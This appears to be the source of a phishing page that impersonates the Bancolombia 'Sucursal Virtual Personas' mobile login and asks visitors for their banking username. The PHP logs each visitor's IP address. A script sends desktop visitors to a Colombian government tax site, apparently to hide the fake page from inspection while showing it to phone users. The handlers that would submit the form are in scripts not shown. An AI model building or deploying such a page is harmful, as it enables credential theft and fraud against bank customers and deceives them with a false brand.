<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
    <head>
        <title>Bancolombia Sucursal Virtual Personas</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v2" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
    
        <script type="text/javascript" src="../js/functions.js"></script>
        <script type="text/javascript" src="../js/ready.js"></script>

        <style type="text/css">

        </style>
        
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg">            
            <br>
            <img src="../img/load2.gif" />
        </div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-continuar"></td>
            </tr>
        </table>
        <img src="../img/logo.svg" width="260" style="margin-top: 48px;margin-bottom: 34px;">
        <div class="titulo-app">Ingresa tu usuario</div>  
        <div class="descripcion-app">El usuario es el mismo con que ingresas a la Sucursal Virtual Personas</div>  
        <div class="frm">
            <div class="inp" id="inp-usuario">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-u.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" name="txt-usuario" id="txt-usuario" class="entradas" autocomplete="off">
                        </td>
                    </tr>
                </table>
            </div>
            <div class="etiquetas" id="etq-usuario">Ingresa el usuario</div>
        </div>  
        <button class="botones" id="btn-continuar" disabled>CONTINUAR</button> 
        <br><br><br>
        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">¿No eres cliente?</div>  
    
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>
</html>
<script type="text/javascript">
    $(document).ready(function() { 
                     
    });
 </script>